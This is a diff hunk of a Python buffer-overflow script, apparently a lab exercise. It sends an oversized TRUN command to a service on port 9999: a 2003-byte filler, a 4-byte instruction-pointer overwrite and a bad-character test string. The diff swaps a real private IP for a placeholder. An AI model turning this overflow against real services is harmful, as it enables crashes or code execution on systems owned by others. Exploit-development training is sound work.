@@ -10,7 +10,7 @@ bad=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x
 send="TRUN /.:/" + "A" * 2003 + "B" * 4 + bad
 bytes=send.encode(encoding="latin1")
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.1.101", 9999)) #Bağlanti bilgilerini kendinize göre düzenleyin.
+s.connect(("192.168.x.x", 9999)) #Bağlanti bilgilerini kendinize göre düzenleyin.
 s.send(bytes)
 s.close() 
 
